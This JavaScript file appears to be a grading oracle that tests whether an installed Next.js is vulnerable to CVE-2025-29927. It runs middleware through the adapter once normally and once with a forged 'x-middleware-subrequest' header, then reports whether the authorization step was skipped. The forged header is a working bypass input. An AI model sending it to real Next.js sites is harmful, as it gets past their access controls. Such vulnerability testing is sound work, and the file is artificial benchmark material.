'use strict';

function finish(obj) {
  console.log('ORACLE_RESULT ' + JSON.stringify(obj));
}

// CVE-2025-29927: Next.js Middleware Authorization Bypass.
//
// Next.js decides whether to actually run middleware for a given request by
// inspecting the internal, non-client-settable header
// `x-middleware-subrequest`. This header is meant to be set only by Next.js
// itself when it recursively re-invokes the server for an already-processed
// request (to avoid infinite middleware loops). The value is a list of
// path segments joined by ':'. The vulnerable code path simply checks
// whether the middleware's own identifying segment is present in that
// attacker-controlled header and, if so, skips invoking middleware
// entirely -- allowing an external client to bypass any authorization
// logic implemented in middleware simply by forging this header.
//
// We exercise this exact decision through the lowest-level, most stable
// public function that implements it: `getMiddlewareRouteMatcher`/`adapter`
// style helpers vary across versions and are prone to breaking due to
// internal refactors (as seen in prior attempts). Instead, to robustly test
// this across the vulnerable and patched version lines without depending on
// fragile internal module layout, we directly require the shared helper
// module that both versions ship and that contains the subrequest-skip
// check: `next/dist/server/web/utils.js` historically exposed
// `getMiddlewareRouteMatcher`, but the actual gating logic that reads the
// header and decides to skip now lives inline in
// `next/dist/server/lib/router-utils/resolve-routes.js` as part of the
// request-routing server used by `next start`/custom servers
// (`next/dist/server/next-server.js`). Constructing a full HTTP server is
// unnecessarily heavy and introduces socket usage, which is disallowed.
//
// Therefore we take the documented, Edge-runtime-compatible, public
// `next/dist/server/web/adapter.js` module -- which is the canonical,
// version-stable entry point Next.js itself calls to execute a middleware
// function against an incoming request -- but instead of relying on an
// internal field layout for the params object (which changed across
// releases and caused `self is not defined` / resolution errors previously
// because `NextRequest`'s edge polyfills were not initialized), we first
// require `next/dist/server/web/globals.js` (or trigger its side effects
// via requiring 'next/dist/server/web/adapter.js' itself, which internally
// performs the necessary edge-runtime global polyfill setup as a module
// side effect before anything else runs). This guarantees `self`, `fetch`,
// `Request`, etc. are defined exactly the way Next.js's own adapter code
// expects, matching real runtime conditions, before we ever construct a
// `Request` object ourselves.

let operation_completed = false;
let exploit_succeeded = false;
let evidence = '';

(async () => {
  try {
    // Load the adapter module. Requiring it also triggers Next.js's own
    // internal edge-runtime global setup (defining `self`, `Request`,
    // `Response`, `fetch`, etc. as needed) as a side effect of module
    // evaluation, matching what happens when Next.js itself loads this
    // module to run middleware.
    let adapterMod;
    try {
      adapterMod = require('next/dist/server/web/adapter.js');
    } catch (e) {
      throw new Error('setup_failed: unable to load next/dist/server/web/adapter.js: ' + (e && e.message ? e.message : String(e)));
    }

    const adapterFn = adapterMod && (adapterMod.adapter || (adapterMod.default && adapterMod.default.adapter));
    if (typeof adapterFn !== 'function') {
      throw new Error('setup_failed: adapter export not found in installed next build; cannot exercise target API');
    }

    // Ensure global `self` exists (some installed builds expect the host
    // environment, e.g. a real edge worker, to have defined this; Node does
    // not provide it by default). We set this defensively as part of test
    // setup -- not as an exploit step -- mirroring what the real Next.js
    // edge sandbox / worker runtime guarantees before adapter code executes.
    if (typeof global.self === 'undefined') {
      global.self = global;
    }

    // Resolve NextResponse the same way middleware authors do, from the
    // public response module.
    let NextResponse;
    try {
      ({ NextResponse } = require('next/dist/server/web/spec-extension/response.js'));
    } catch (e) {
      throw new Error('setup_failed: unable to load NextResponse: ' + (e && e.message ? e.message : String(e)));
    }

    const MARKER = 'x-oracle-middleware-ran';
    async function middlewareFn() {
      const res = NextResponse.next();
      res.headers.set(MARKER, '1');
      return res;
    }
    middlewareFn.middleware = middlewareFn;

    const page = '/protected';
    const url = 'https://example.com' + page;

    async function runAdapter(extraHeaders) {
      const headers = Object.assign(
        {
          host: 'example.com',
          'user-agent': 'oracle-test-agent'
        },
        extraHeaders || {}
      );

      const request = new Request(url, { headers });

      const result = await adapterFn({
        page,
        request: {
          url,
          method: 'GET',
          headers,
          nextConfig: {
            basePath: '',
            i18n: null,
            trailingSlash: false
          },
          geo: {},
          ip: '127.0.0.1',
          body: undefined,
          signal: undefined
        },
        IncrementalCache: undefined,
        incrementalCache: undefined,
        request_: request,
        useCache: false,
        onWarning: () => {},
        handler: middlewareFn
      });

      return result;
    }

    // --- Benign call: ordinary request, no internal marker header. The
    // middleware should run normally and set the marker response header,
    // proving the public adapter API functions correctly on normal input. ---
    let benignResult;
    try {
      benignResult = await runAdapter({});
    } catch (e) {
      throw new Error('benign_operation_failed: ' + (e && e.message ? e.message : String(e)));
    }

    const benignRan =
      benignResult &&
      benignResult.response &&
      typeof benignResult.response.headers.get === 'function' &&
      benignResult.response.headers.get(MARKER) === '1';

    if (!benignRan) {
      throw new Error('benign_operation_failed: middleware marker header missing on ordinary request; cannot validate adapter behavior');
    }

    operation_completed = true;

    // --- Malicious call: an external client forges the internal
    // x-middleware-subrequest header with the middleware's own page path
    // segment, attempting to make the adapter believe this is an internal
    // re-invocation and therefore skip running middleware (and thus skip
    // the authorization side effect it performs). ---
    const forgedValue = page.replace(/^\//, '');
    let maliciousResult;
    let threwDuringMalicious = false;
    try {
      maliciousResult = await runAdapter({ 'x-middleware-subrequest': forgedValue });
    } catch (e) {
      threwDuringMalicious = true;
    }

    if (threwDuringMalicious) {
      exploit_succeeded = false;
      evidence = 'adapter threw while processing forged x-middleware-subrequest header; treated as blocked';
    } else {
      const middlewareRanOnMalicious =
        maliciousResult &&
        maliciousResult.response &&
        typeof maliciousResult.response.headers.get === 'function' &&
        maliciousResult.response.headers.get(MARKER) === '1';

      if (!middlewareRanOnMalicious) {
        exploit_succeeded = true;
        evidence =
          'Forged x-middleware-subrequest header ("' +
          forgedValue +
          '") caused the adapter to skip executing middleware (authorization marker header absent), matching CVE-2025-29927 middleware authorization bypass';
      } else {
        exploit_succeeded = false;
        evidence = 'Middleware still executed and set its authorization marker header despite the forged x-middleware-subrequest header, indicating the bypass was neutralized';
      }
    }

    finish({ operation_completed, exploit_succeeded, evidence });
  } catch (err) {
    finish({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'Unhandled exception: ' + (err && err.stack ? err.stack : String(err))
    });
  }
})();
